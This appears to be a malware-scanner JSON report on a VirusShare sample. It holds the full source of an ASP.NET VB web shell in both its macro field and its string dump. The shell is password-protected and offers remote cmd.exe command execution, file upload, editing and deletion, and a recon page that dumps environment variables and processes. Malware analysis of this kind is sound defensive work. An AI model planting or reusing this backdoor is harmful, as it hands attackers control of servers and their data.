{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
            "System": "May run an executable file or a system command on a Mac",
            "call": "May call a DLL using Excel 4 Macros",
            "copyfile": "May copy a file",
            "write": "May write to a file"
        },
        "macro": "<%@page Language=\"VB\" Debug=\"true\" trace=\"false\" validateRequest=\"false\" %>\n<%@ import namespace=\"System.IO\"%>\n<%@ import namespace=\"System.Net\"%>\n<%@ Import Namespace=\"System.Diagnostics\" %>\n<script runat=\"server\">\nprivate PassWord as string=\"swords\" \ndim url as string\ndim xdir  as directoryinfo\ndim xfile as fileinfo\ndim mydir as directoryInfo\n\nSub Page_Load(Src as object, E as EventArgs)\n\tif request.QueryString(\"src\")<>\"\" then\n\t\turl=request.QueryString(\"src\")\n\telse\n\t\turl=server.MapPath(\".\") & \"\\\"\n\tend if\n\tif session(\"12345\")<>\"swords\" then\n\t\tcall login()\n\telse\n\t\tDim ex as Exception\n\t\tTry\n\t\t\tdim action as string=request.params(\"act\")\n\t\t\tselect case action\n\t\t\t\tcase \"info\"\n\t\t\t\t\tcall info()\n\t\t\t\tcase \"cmdshell\"\n\t\t\t\t\tcall cmdshell()\n\t\t\t\tcase \"loginout\"\n\t\t\t\t\tcall loginout()\n\t\t\t\tcase \"filemanage\"\n\t\t\t\t\tcall filemanage()\n\t\t\t\tcase \"edit\"\n\t\t\t\t\tcall edit()\n\t\t\t\tcase \"del\"\n\t\t\t\t\tcall del()\n\t\t\t\tcase \"rename\"\n\t\t\t\t\tcall rename()\n\t\t\tend select\n\t\tCatch ex\n\t\t\tlblerror.Text =(\"<font color=\"\"red\"\">\ufffd\ufffd\ufffd\ufffd\ufffd\ucce3\ufffd\ufffd</font>\" & ex.Message)\n\t\tEnd Try\n\tend if\nend sub\n\nsub login()\n\tpanel01.visible=\"true\"\n\tpanel02.visible=\"false\"\n\tpanel03.visible=\"false\"\nend sub\n\nsub loginout()\n\tsession.abandon()\n\tpanel01.visible=\"true\"\nend sub\n\nsub filemanage()\n\turl=request.params(\"src\")\n\tif url=\"\" then\n\t\turl=server.mappath(\".\") & \"\\\"\n\tend if\n\tpanel02.visible=\"true\"\n\tdir.value=url\n\tlblpath.text=\"\ufffd\ufffd\u01f0\u013f\u00bc\ufffd\ufffd\"& url\nend sub\n\nsub edit()\n\tpanel03.visible=\"true\"\n\tif tbcontents.text=\"\" then\n\t\ttbfile.text=request.QueryString(\"src\")\n\t\tdim objreader as new streamreader(tbfile.text,encoding.default)\n\t\ttbcontents.text=objreader.readtoend\n\t\tobjreader.close\n\tend if\nend sub\n\nsub writefile(Src As Object, E As EventArgs)\n\tdim objwriter as streamwriter\n\tif file.exists(tbfile.text) then\n\tobjwriter=new streamwriter(tbfile.text,false,encoding.default)\n\tobjwriter.write(tbcontents.text)\n\tobjwriter.close\n\tend if\nend sub\n\nsub runlogin(Src As Object, E As EventArgs)\n\tif tbpmd.text=PassWord then \n\t\tsession(\"12345\")=\"swords\"\n\t\tsession.Timeout=3600 'one hour\n\t\tcall filemanage()\n\t\tpanel01.visible=\"false\"\n\t\tlblerror.text=\"\"\n\telse\n\t\tlblerror.text=\"<font color='red'>\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd</font><br>\"\n\tend if\nend sub\n\nsub info()\n\tlblinfo.text+=(\"<em>\ufffd\u037b\ufffd\ufffd\ufffdIP:</em>\" & request.ServerVariables(\"REMOTE_ADDR\") & \"<br>\")\n\tlblinfo.text+=(\"<em>\ufffd\u037b\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd:</em>\" & request.ServerVariables(\"HTTP_USER_AGENT\") & \"<br>\")\n\tlblinfo.text+=(\"<em>\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u6c7e:</em> \" & Environment.OSVersion.tostring() & \"<br>\")\n\tlblinfo.text+=(\"<em>IIS\ufffd\u6c7e:</em>\" & request.ServerVariables(\"SERVER_SOFTWARE\") & \"<br>\")\n\tlblinfo.text+=(\"<em>\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd:</em> \"  &Environment.MachineName &\"<br>\")\n\tlblinfo.text+=(\"<em>\ufffd\ufffd\ufffd\ufffd\ufffd\ufffdIP: </em>\")\n\tDim addressList As IPAddress() = Dns.GetHostByName(Dns.GetHostName()).AddressList \n\tDim i As Integer \n\tFor i = 0 To addressList.Length - 1 \n\t\tlblinfo.text+= addressList(i).ToString() & \"<br>\"\n\tNext i \n\tlblinfo.text+=(\"<em>\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u02b1\ufffd\ufffd:</em> \"  &Environment.TickCount/1000/60/60 &\"\u0421\u02b1<br>\")\n\tlblinfo.text+=(\"<em>UserDomainName:</em> \"  &Environment.UserDomainName &\"<br>\")\n\tlblinfo.text+=(\"<em>WorkingSet:</em> \"  &Environment.WorkingSet &\"<br>\")\n\tlblinfo.text+=(\"<em>UserName:</em> \"  &Environment.UserName &\"<br>\")\n\tlblinfo.text+=(\"<em>UserInteractive:</em> \"  &Environment.UserInteractive &\"<br>\")\n\tlblinfo.text+=(\"<em>\ufffd\u07fc\ufffd\ufffd\ufffd  :</em> \")  \n\tDim drives As [String]()= Environment.GetLogicalDrives()\n    Dim d As string\n    For Each d In drives\n         \tlblinfo.text+=\"<em> \" & d & \" </em>\"\n\tnext d\n\n\tlblinfo.text+=(\"<p><em>\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd  :</em>\")\n\tlblinfo.text+ = \"<br>----------------------------------------------<br>\"\n    Dim environmentVariables As IDictionary = Environment.GetEnvironmentVariables()\n\tDim de As DictionaryEntry\n    For Each de In environmentVariables\n         \tlblinfo.text+=\"<em>\" & de.Key & \":</em>\" & de.Value & \"<br>\"\n\tnext de\n\tlblinfo.text+ = \"<br>----------------------------------------------<br>\"\n\tlblinfo.text+ =\"<p><em>\ufffd\ufffd\u01f0\ufffd\ufffd\ufffd\u0323\ufffd</em>\"\n\tlblinfo.text+ = \"<br>----------------------------------------------<br>\"\n\tDim p As Process \n\tFor Each p In Process.GetProcesses() \n\t\tlblinfo.text+ = p.ToString() & \"<br>\"\n\tNext p \n\tlblinfo.text+ = \"<br>----------------------------------------------<br>\"\n\nend sub\n\nsub cmdshell()\n\tpanel0.visible=\"true\"\nend sub\n\nSub runcmd(Src As Object, E As EventArgs)\n\tDim ex as Exception\n\ttry\n\t\tdim psi As New ProcessStartInfo(\"cmd.exe\")\n\t\tpsi.UseShellExecute = False\n\t\tpsi.RedirectStandardOutput = true\n\t\t\n\t\tdim pro as new process()\n\t\tpro.startinfo=psi\n\t\tpro.startinfo.arguments=\"/c \" & tbcmd.text\n\t\tpro.start()\n\t\t\n\t\tdim objreader as streamreader=pro.standardoutput\n\t\tlblcmd.text=\"<pre>\" & objreader.readtoend & \"</pre>\"\n\t\tobjreader.close()\n\t\tpro.close()\n\tCatch ex\n\t\tlblerror.Text =(\"<font color=\"\"red\"\">\ufffd\ufffd\ufffd\ufffd\ufffd\ucce3\ufffd\ufffd</font>\" & ex.Message)\n\tEnd Try\nEnd Sub\n\nSub UploadFile_Clicked ( Sender as Object, e as EventArgs ) \n\tDim ex as Exception\n\ttry\n\ufffd\ufffd\ufffd\ufffd\tDim lstrFileName as string \n\ufffd\ufffd\ufffd\ufffd\tDim lstrFileNamePath as string \n\ufffd\ufffd\ufffd\ufffd\tDim lstrFileFolder as string \n\t\t\n\ufffd\ufffd\ufffd\ufffd\tif dir.value <> \"\" then \n\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\tlstrFileFolder = dir.value \n\ufffd\ufffd\ufffd\ufffd\telse \n\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\tlstrFileFolder = url \n\ufffd\ufffd\ufffd\ufffd\tend if \n\ufffd\ufffd\ufffd\ufffd\tlstrFileName = loFile.PostedFile.FileName\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\n\ufffd\ufffd\ufffd\ufffd\tlstrFileName = Path.GetFileName ( lstrFileName ) \ufffd\ufffd\ufffd\ufffd\t\n\ufffd\ufffd\ufffd\ufffd\tIf ( not Directory.Exists ( lstrFileFolder ) ) Then \n\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\tDirectory.CreateDirectory ( lstrFileFolder ) \n\ufffd\ufffd\ufffd\ufffd\tEnd If \ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\n\ufffd\ufffd\ufffd\ufffd\tlstrFileNamePath = lstrFileFolder & lstrFileName \n\ufffd\ufffd\ufffd\ufffd\tloFile.PostedFile.SaveAs ( lstrFileNamePath ) \ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\t\n\ufffd\ufffd\ufffd\ufffd\tFileName.Text = lstrFileName\n\ufffd\ufffd\ufffd\ufffd\tFileType.Text = loFile.PostedFile.ContentType \n\ufffd\ufffd\ufffd\ufffd\tFileLength.Text = cStr ( loFile.PostedFile.ContentLength ) \n\ufffd\ufffd\ufffd\ufffd\tpanel02.visible = false \n\ufffd\ufffd\ufffd\ufffd\tpanel04.visible = true\n\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\t\n\ufffd\ufffd\ufffd\ufffdCatch ex\n\t\tlblerror.Text =(\"<font color=\"\"red\"\">\ufffd\ufffd\ufffd\ufffd\ufffd\ucce3\ufffd\ufffd</font>\" & ex.Message)\n\tEnd Try\nEnd sub  \n\n\nsub del()\n\tdim temp as string\n\ttemp=request.QueryString(\"src\")\n\tcall delfile(temp)  \n\tlblerror.text=\"\u027e\ufffd\ufffd\ufffd\u013c\ufffd \" & temp & \" \ufffd\u0279\ufffd\ufffd\ufffd\"\nend sub\n\nsub delfile(temp)\n\tDim ex as Exception\n\ttry\n\t\tif right(temp,1)=\"\\\" then\n\t\t\tdim xdir as directoryinfo\n\t\t\tdim mydir as new DirectoryInfo(temp)\n\t\t\tdim xfile as fileinfo\n\t\t\tfor each xfile in mydir.getfiles()\n\t\t\t\tfile.delete(temp & xfile.name)\n\t\t\tnext\n\t\t\tfor each xdir in mydir.getdirectories()\n\t\t\t\tcall delfile(temp & xdir.name & \"\\\")\n\t\t\tnext\n\t\t\tdirectory.delete(temp)\n\t\telse\n\t\t\tfile.delete(temp)\n\t\tend if\n\tCatch ex\n\t\tlblerror.Text =(\"<font color=\"\"red\"\">\ufffd\ufffd\ufffd\ufffd\ufffd\ucce3\ufffd\ufffd</font>\" & ex.Message)\n\tEnd Try\nEnd Sub\n\nSub movefile ( Sender as Object, e as EventArgs ) \n\tDim ex as Exception\n\ttry\n\t\tlblpath.text= srcfile.text & \"->\" & desfile.text & \"\ufffd\u013c\ufffd\ufffd\ufffd\ufffd\u01b6\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u047e\ufffd\ufffd\u0279\ufffd\ufffd\ufffd\u0263\ufffd\"\n\t\tFile.move( srcfile.text , desfile.text ) \n\tCatch ex\n\t\tlblerror.Text =(\"<font color=\"\"red\"\">\ufffd\ufffd\ufffd\ufffd\ufffd\ucce3\ufffd\ufffd</font>\" & ex.Message)\n\tEnd Try\nEnd sub \n\nSub copyfile ( Sender as Object, e as EventArgs ) \n\tDim ex as Exception\n\ttry\n\t\tFile.copy( srcfile.text , desfile.text ) \n\tCatch ex\n\t\tlblerror.Text =(\"<font color=\"\"red\"\">\ufffd\ufffd\ufffd\ufffd\ufffd\ucce3\ufffd\ufffd</font>\" & ex.Message)\n\tEnd Try\nEnd sub   \n\nsub rename()\n\turl=request.QueryString(\"src\")\n\tpanel05.visible=\"true\"\nend sub\n\nsub rename_clicked( Sender as Object, e as EventArgs ) \n\tDim ex as Exception\n\ttry\n\t\tmydir=new directoryinfo(url)\n\t\tfile.copy(url,mydir.parent.fullname & newfilename.text)\n\t\tcall delfile(url)  \n\t\tlblpath.text=\"\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd \" & replace(url,\"\\\",\"\\\\\") & \" \ufffd\u0279\ufffd\ufffd\ufffd\"\n\tCatch ex\n\t\tlblerror.Text =(\"<font color=\"\"red\"\">\ufffd\ufffd\ufffd\ufffd\ufffd\ucce3\ufffd\ufffd</font>\" & ex.Message)\n\tEnd Try\nend sub\n</script>\n\n<html><head>\n<meta http-equiv=\"Content-Type\" content=\"text/html\" charset=gb2312>\n<title>12345</title>\n<style type=\"text/css\">\nA\n{\n\tfont-family: verdana, arial, Geneva, Helvetica, sans-serif;\n\tcolor: #FAFC72;\n\ttext-decoration: none;\n}\n\nA:hover\n{\n\ttext-decoration: underline;\n}\n\nTD\n{\n\tfont-family: verdana, arial, Geneva, Helvetica, sans-serif;\n\tfont-size: 9pt;\n\tcolor: #FFFFFF;\n}\n\n.btn\n{\n\tcolor: #FAFC72;\n\tbackground-color: #000000;\n}\n\nhtml, body\n{\n\tmargin:0;\n\tpadding:0;\n\tcolor: #FAFC72;\n\tbackground-color: #000000;\n}\n</style>\n<script language=\"javascript\">\nfunction del()\n{\nif(confirm(\"\u0237\ufffd\ufffd\u027e\ufffd\ufffd\ufffd\ufffd\")){return true;}\nelse{return false;}\n}\n</script>\n</head><body>\n<div style=\"padding:15,15,15,15;font-size:10pt;font-family:verdana\"; \nborder-width:2px 2px 2px 2px; border-style:solid; border-color:black;\">\n<center>[<a href=\"?act=info\">\u03f5\u0373\ufffd\ufffd\ufffd\ufffd</a>] | [<a href=\"?act=cmdshell\">Net.Cmd</a>]| [<a href=\"?act=filemanage\">\ufffd\u013c\ufffd\ufffd\ufffd\ufffd\ufffd</a>] | [<a href=\"javascript:history.back(1);\">\ufffd\ufffd\ufffd\ufffd</a>] | [<a href=\"?act=loginout\">\ufffd\u02f3\ufffd</a>]</center>\n<hr width=\"90%\">\n\n<form method = \"post\" enctype = \"multipart/form-data\" runat = \"server\">\n\n<table width=\"80%\"  border=\"0\" align=\"center\">\n<asp:label id=\"lblinfo\"  runat=\"server\"  maintainstate=\"false\"/><p>\n<asp:label id=\"lblerror\"  runat=\"server\"  maintainstate=\"false\"/><p>\n</table>\n\n<asp:panel id=\"Panel0\" runat=\"server\"  visible=\"false\">\n<table width=\"80%\"  border=\"0\" align=\"center\">\n<asp:textbox id=\"tbcmd\"  width=\"30%\" runat=\"server\"/>\n<asp:button id=\"btcmd\" text=\"runcmd\" class=\"btn\" onclick=\"runcmd\" runat=\"server\"/></center><br>\n<asp:label id=\"lblcmd\" runat=\"server\"/>\n</table>\n</asp:panel>\n\n<asp:panel id=\"panel01\" runat=\"server\"  visible=\"false\">\n<center><asp:textbox id=\"tbpmd\" textmode=\"password\" runat=\"server\"/>\n<asp:button id=\"btlogin\" text=\"Login\" class=\"btn\" onclick=\"runlogin\" runat=\"server\"/></center>\n</asp:panel>\n\n<asp:panel id=\"panel02\" runat=\"server\"  visible=\"false\">\n<table width=\"80%\"  border=\"0\" align=\"center\">\n<asp:label id=\"lblpath\" runat=\"server\"/>\n\t<tr>\ufffd\u013c\ufffd\ufffd\u03f4\ufffd\ufffd\ufffd<br>\t\n\ufffd\ufffd\u0461\ufffd\ufffd\ufffd\u013c\ufffd\ufffd\ufffd<input id = \"loFile\" type = \"file\" runat = \"server\" > <br >\n\ufffd\ufffd\ufffd\u03f4\ufffd\u013f\u00bc\ufffd\ufffd<input id = \"dir\" type = \"text\" runat = \"server\" >\n\ufffd\ufffd<input type = \"submit\" class=\"btn\" value = \"\ufffd\u03f4\ufffd\ufffd\u013c\ufffd\" OnServerClick = \"UploadFile_Clicked\" runat = \"server\" >\n\ufffd\ufffd<br >\n\t</tr>\n\t<hr>\n\t<tr>\ufffd\u013c\ufffd\ufffd\u01b6\ufffd/\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd<br>\n\ufffd\ufffd\u0534\ufffd\ufffd\u05b7\ufffd\ufffd <asp:textbox id=\"srcfile\"  width=\"90%\" runat=\"server\" /><br >\n\ufffd\ufffd\u013f\ufffd\u0135\ufffd\u05b7\ufffd\ufffd<asp:textbox id=\"desfile\"  width=\"90%\" runat=\"server\" /><br>\n  <asp:button id=\"btmove\" text=\"\ufffd\u01b6\ufffd\" class=\"btn\"\ufffd\ufffdOnServerClick = \"moveFile\" runat = \"server\"/>\n\ufffd\ufffd<asp:button id=\"btcopy\" text=\"\ufffd\ufffd\ufffd\ufffd\" class=\"btn\"\ufffd\ufffdOnServerClick = \"copyFile\" runat = \"server\"/>\n\ufffd\ufffd<br >\n\t</tr>\n\t<hr>\n\t<tr>\n\t\t<td width=\"15%\"><strong>\ufffd\ufffd\ufffd\ufffd</strong></td>\n\t\t<td width=\"10%\"><strong>\ufffd\ufffd\u0421(byte)</strong></td>\n\t\t<td width=\"10%\"><strong>\ufffd\ufffd\ufffd\ufffd\u02b1\ufffd\ufffd</strong></td>\n\t\t<td width=\"10%\"><strong>\ufffd\u07b8\ufffd\u02b1\ufffd\ufffd</strong></td>\n\t\t<td width=\"10%\"><strong>\ufffd\ufffd\ufffd\ufffd\u02b1\ufffd\ufffd</strong></td>\n\t\t<td width=\"25%\"><strong>\ufffd\ufffd\ufffd\ufffd</strong></td>\n\t</tr>\n    <tr>\n       <td>\n\t\t<%\n\t\tmydir=new directoryinfo(url)\n\t\tdim panel02info as string= \"<tr><td><a href='?act=filemanage&src=\" & server.urlencode(mydir.parent.fullname) &  \"\\'>\ufffd\ufffd\u013f\u00bc..</a></td></tr>\"\n\t\tresponse.Write(panel02info)\n\n\t\tfor each xdir in mydir.getdirectories\n\t\t\tresponse.Write(\"<tr>\")\n\t\t\tdim filepath as string \n\t\t\tfilepath=server.UrlEncode(url & xdir.name)\n\t\t\tpanel02info= \"<td><a href='?act=filemanage&src=\" & filepath & \"\\\" & \"'>\" & xdir.name & \"</a></td>\"\n\t\t\tresponse.Write(panel02info)\n\t\t\tresponse.Write(\"<td>&lt;dir&gt;</td>\")\n\t\t\t\n\t\t\tresponse.Write(\"<td>\" & Directory.GetCreationTime(url & xdir.name) & \"</td>\")\n   \t\t\tresponse.Write(\"<td>\" & Directory.GetLastWriteTime(url & xdir.name) & \"</td>\")\n\t\t\tresponse.Write(\"<td>\" & Directory.GetlastAccessTime(url & xdir.name) & \"</td>\")\n\n\t\t\tpanel02info=\"<td><a href='?act=del&src=\" & filepath & \"\\'\" & \" onclick='return del(this);'>\u027e\ufffd\ufffd</a></td>\"\n\t\t\tresponse.Write(panel02info)\n\t\t\tresponse.Write(\"</tr>\")\n\t\tnext\n\t\t%>\n\t\t</td>\n\t</tr>\n\t<tr>\n        <td>\n\t\t<%\n\t\tfor each xfile in mydir.getfiles()\n\t\t\tdim filepath2 as string\n\t\t\tfilepath2=server.UrlEncode(url & xfile.name)\n\t\t\tresponse.Write(\"<tr>\")\n\t\t\tpanel02info=\"<td>\" & xfile.name & \"</td>\"\n\t\t\tresponse.Write(panel02info)\n\t\t\tpanel02info=\"<td>\" & xfile.length & \"</td>\"\n\t\t\tresponse.Write(panel02info)\n\n\t\t\tresponse.Write(\"<td>\" & File.GetCreationTime(url & xfile.name) & \"</td>\")\n\t\t\tresponse.Write(\"<td>\" & File.GetLastWriteTime(url & xfile.name) & \"</td>\")\n\t\t\tresponse.Write(\"<td>\" & File.GetlastAccessTime(url & xfile.name) & \"</td>\")\t\n\n\t\t\tpanel02info=\"<td><a href='?act=edit&src=\" & filepath2 & \"' target='_blank'>\ufffd\u0f2d</a>|<a href='?act=rename&src=\" & filepath2 & \"' target='_blank'>\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd</a>|<a href='?act=del&src=\" & filepath2 & \"' onClick='return del(this);'>\u027e\ufffd\ufffd</a></td>\"\n\t\t\tresponse.Write(panel02info)\n\t\t\tresponse.Write(\"</tr>\")\n\t\tnext\n\t\tresponse.Write(\"</table>\")\n\t\t%>\n\t\t</td>\n    </tr>\n</table>\n</asp:panel>\n\n<asp:panel id=\"panel03\" runat=\"server\"  visible=\"false\">\n<table width=\"80%\"  border=\"0\" align=\"center\">\n\u00b7\ufffd\ufffd\ufffd\ufffd<asp:textbox id=\"tbfile\"  width=\"90%\" runat=\"server\" /><p>\n\ufffd\ufffd\ufffd\u0763\ufffd<asp:textbox id=\"tbcontents\" runat=\"server\" textmode=\"multiline\" columns=\"80\" rows=\"20\" />\n<p>\n<asp:button id=\"btwrite\" class=\"btn\" runat=\"server\" onclick=\"writefile\" text=\"\ufffd\ufffd\ufffd\ufffd\ufffd\u07b8\ufffd\"/>\n</table>\n</asp:panel>\n<ASP:panel id = \"panel04\" visible = \" false \" runat = \"server\">\n<table width=\"80%\"  border=\"0\" align=\"center\">\n\ufffd\u0279\ufffd\ufffd\u03f4\ufffd <ASP:label id = \"FileName\" runat = \"server\" /> <br>\n\ufffd\u013c\ufffd\ufffd\ufffd\u0421 <ASP:label id = \"FileLength\" runat = \"server\" /> bytes <br>\n\ufffd\u013c\ufffd\ufffd\ufffd\ufffd\ufffd <ASP:label id = \"FileType\" runat = \"server\" /> <br>\n</table>\n</ASP:panel>\n<ASP:panel id = \"panel05\" visible = \" false \" runat = \"server\">\n<table width=\"80%\"  border=\"0\" align=\"center\">\n\ufffd\ufffd\ufffd\u013c\ufffd\ufffd\ufffd: <ASP:textbox id = \"newFileName\" runat = \"server\" /> <br>\n<asp:button id=\"btrename\" class=\"btn\" runat=\"server\" onclick=\"rename_clicked\" text=\"\ufffd\ufffd\ufffd\ufffd\ufffd\u07b8\ufffd\"/>\n</table>\n</ASP:panel>\n</form>  \n<hr width=\"90%\">\n</div>\n</body></html>"
    },
    "filename": "VirusShare_215b5d06786c1266d6856761c01a24fe",
    "filesize": 13754,
    "filetype": "HTML document, ISO-8859 text, with CRLF line terminators",
    "hashes": {
        "md5": "215b5d06786c1266d6856761c01a24fe",
        "sha1": "31de7640b31c443af35134d754e7407a1c38e79f",
        "sha256": "db390385e24cc7f83fc8104f33d9299bb12a3edce37c5ea073d3c893cb01aa9b"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "<%@page Language=\"VB\" Debug=\"true\" trace=\"false\" validateRequest=\"false\" %>",
            "<%@ import namespace=\"System.IO\"%>",
            "<%@ import namespace=\"System.Net\"%>",
            "<%@ Import Namespace=\"System.Diagnostics\" %>",
            "<script runat=\"server\">",
            "private PassWord as string=\"swords\" ",
            "dim url as string",
            "dim xdir  as directoryinfo",
            "dim xfile as fileinfo",
            "dim mydir as directoryInfo",
            "Sub Page_Load(Src as object, E as EventArgs)",
            "\tif request.QueryString(\"src\")<>\"\" then",
            "\t\turl=request.QueryString(\"src\")",
            "\telse",
            "\t\turl=server.MapPath(\".\") & \"\\\"",
            "\tend if",
            "\tif session(\"12345\")<>\"swords\" then",
            "\t\tcall login()",
            "\telse",
            "\t\tDim ex as Exception",
            "\t\tTry",
            "\t\t\tdim action as string=request.params(\"act\")",
            "\t\t\tselect case action",
            "\t\t\t\tcase \"info\"",
            "\t\t\t\t\tcall info()",
            "\t\t\t\tcase \"cmdshell\"",
            "\t\t\t\t\tcall cmdshell()",
            "\t\t\t\tcase \"loginout\"",
            "\t\t\t\t\tcall loginout()",
            "\t\t\t\tcase \"filemanage\"",
            "\t\t\t\t\tcall filemanage()",
            "\t\t\t\tcase \"edit\"",
            "\t\t\t\t\tcall edit()",
            "\t\t\t\tcase \"del\"",
            "\t\t\t\t\tcall del()",
            "\t\t\t\tcase \"rename\"",
            "\t\t\t\t\tcall rename()",
            "\t\t\tend select",
            "\t\tCatch ex",
            "\t\t\tlblerror.Text =(\"<font color=\"\"red\"\">\ucce3</font>\" & ex.Message)",
            "\t\tEnd Try",
            "\tend if",
            "end sub",
            "sub login()",
            "\tpanel01.visible=\"true\"",
            "\tpanel02.visible=\"false\"",
            "\tpanel03.visible=\"false\"",
            "end sub",
            "sub loginout()",
            "\tsession.abandon()",
            "\tpanel01.visible=\"true\"",
            "end sub",
            "sub filemanage()",
            "\turl=request.params(\"src\")",
            "\tif url=\"\" then",
            "\t\turl=server.mappath(\".\") & \"\\\"",
            "\tend if",
            "\tpanel02.visible=\"true\"",
            "\tdir.value=url",
            "\tlblpath.text=\"\u01f0\u013f",
            "\"& url",
            "end sub",
            "sub edit()",
            "\tpanel03.visible=\"true\"",
            "\tif tbcontents.text=\"\" then",
            "\t\ttbfile.text=request.QueryString(\"src\")",
            "\t\tdim objreader as new streamreader(tbfile.text,encoding.default)",
            "\t\ttbcontents.text=objreader.readtoend",
            "\t\tobjreader.close",
            "\tend if",
            "end sub",
            "sub writefile(Src As Object, E As EventArgs)",
            "\tdim objwriter as streamwriter",
            "\tif file.exists(tbfile.text) then",
            "\tobjwriter=new streamwriter(tbfile.text,false,encoding.default)",
            "\tobjwriter.write(tbcontents.text)",
            "\tobjwriter.close",
            "\tend if",
            "end sub",
            "sub runlogin(Src As Object, E As EventArgs)",
            "\tif tbpmd.text=PassWord then ",
            "\t\tsession(\"12345\")=\"swords\"",
            "\t\tsession.Timeout=3600 'one hour",
            "\t\tcall filemanage()",
            "\t\tpanel01.visible=\"false\"",
            "\t\tlblerror.text=\"\"",
            "\telse",
            "\t\tlblerror.text=\"<font color='red'></font><br>\"",
            "\tend if",
            "end sub",
            "sub info()",
            "\tlblinfo.text+=(\"<em>\u037bIP:</em>\" & request.ServerVariables(\"REMOTE_ADDR\") & \"<br>\")",
            "\tlblinfo.text+=(\"<em>\u037b:</em>\" & request.ServerVariables(\"HTTP_USER_AGENT\") & \"<br>\")",
            "\tlblinfo.text+=(\"<em>\u6c7e:</em> \" & Environment.OSVersion.tostring() & \"<br>\")",
            "\tlblinfo.text+=(\"<em>IIS\u6c7e:</em>\" & request.ServerVariables(\"SERVER_SOFTWARE\") & \"<br>\")",
            "\tlblinfo.text+=(\"<em>:</em> \"  &Environment.MachineName &\"<br>\")",
            "\tlblinfo.text+=(\"<em>IP: </em>\")",
            "\tDim addressList As IPAddress() = Dns.GetHostByName(Dns.GetHostName()).AddressList ",
            "\tDim i As Integer ",
            "\tFor i = 0 To addressList.Length - 1 ",
            "\t\tlblinfo.text+= addressList(i).ToString() & \"<br>\"",
            "\tNext i ",
            "\tlblinfo.text+=(\"<em>\u02b1:</em> \"  &Environment.TickCount/1000/60/60 &\"\u0421\u02b1<br>\")",
            "\tlblinfo.text+=(\"<em>UserDomainName:</em> \"  &Environment.UserDomainName &\"<br>\")",
            "\tlblinfo.text+=(\"<em>WorkingSet:</em> \"  &Environment.WorkingSet &\"<br>\")",
            "\tlblinfo.text+=(\"<em>UserName:</em> \"  &Environment.UserName &\"<br>\")",
            "\tlblinfo.text+=(\"<em>UserInteractive:</em> \"  &Environment.UserInteractive &\"<br>\")",
            "\tlblinfo.text+=(\"<em>\u07fc  :</em> \")  ",
            "\tDim drives As [String]()= Environment.GetLogicalDrives()",
            "    Dim d As string",
            "    For Each d In drives",
            "         \tlblinfo.text+=\"<em> \" & d & \" </em>\"",
            "\tnext d",
            "\tlblinfo.text+=(\"<p><em>  :</em>\")",
            "\tlblinfo.text+ = \"<br>----------------------------------------------<br>\"",
            "    Dim environmentVariables As IDictionary = Environment.GetEnvironmentVariables()",
            "\tDim de As DictionaryEntry",
            "    For Each de In environmentVariables",
            "         \tlblinfo.text+=\"<em>\" & de.Key & \":</em>\" & de.Value & \"<br>\"",
            "\tnext de",
            "\tlblinfo.text+ = \"<br>----------------------------------------------<br>\"",
            "\tlblinfo.text+ =\"<p><em>\u01f0\u0323</em>\"",
            "\tlblinfo.text+ = \"<br>----------------------------------------------<br>\"",
            "\tDim p As Process ",
            "\tFor Each p In Process.GetProcesses() ",
            "\t\tlblinfo.text+ = p.ToString() & \"<br>\"",
            "\tNext p ",
            "\tlblinfo.text+ = \"<br>----------------------------------------------<br>\"",
            "end sub",
            "sub cmdshell()",
            "\tpanel0.visible=\"true\"",
            "end sub",
            "Sub runcmd(Src As Object, E As EventArgs)",
            "\tDim ex as Exception",
            "\ttry",
            "\t\tdim psi As New ProcessStartInfo(\"cmd.exe\")",
            "\t\tpsi.UseShellExecute = False",
            "\t\tpsi.RedirectStandardOutput = true",
            "\t\tdim pro as new process()",
            "\t\tpro.startinfo=psi",
            "\t\tpro.startinfo.arguments=\"/c \" & tbcmd.text",
            "\t\tpro.start()",
            "\t\tdim objreader as streamreader=pro.standardoutput",
            "\t\tlblcmd.text=\"<pre>\" & objreader.readtoend & \"</pre>\"",
            "\t\tobjreader.close()",
            "\t\tpro.close()",
            "\tCatch ex",
            "\t\tlblerror.Text =(\"<font color=\"\"red\"\">\ucce3</font>\" & ex.Message)",
            "\tEnd Try",
            "End Sub",
            "Sub UploadFile_Clicked ( Sender as Object, e as EventArgs ) ",
            "\tDim ex as Exception",
            "\ttry",
            "\tDim lstrFileName as string ",
            "\tDim lstrFileNamePath as string ",
            "\tDim lstrFileFolder as string ",
            "\tif dir.value <> \"\" then ",
            "\tlstrFileFolder = dir.value ",
            "\telse ",
            "\tlstrFileFolder = url ",
            "\tend if ",
            "\tlstrFileName = loFile.PostedFile.FileName",
            "\tlstrFileName = Path.GetFileName ( lstrFileName ) \t",
            "\tIf ( not Directory.Exists ( lstrFileFolder ) ) Then ",
            "\tDirectory.CreateDirectory ( lstrFileFolder ) ",
            "\tEnd If ",
            "\tlstrFileNamePath = lstrFileFolder & lstrFileName ",
            "\tloFile.PostedFile.SaveAs ( lstrFileNamePath ) \t",
            "\tFileName.Text = lstrFileName",
            "\tFileType.Text = loFile.PostedFile.ContentType ",
            "\tFileLength.Text = cStr ( loFile.PostedFile.ContentLength ) ",
            "\tpanel02.visible = false ",
            "\tpanel04.visible = true",
            "Catch ex",
            "\t\tlblerror.Text =(\"<font color=\"\"red\"\">\ucce3</font>\" & ex.Message)",
            "\tEnd Try",
            "End sub  ",
            "sub del()",
            "\tdim temp as string",
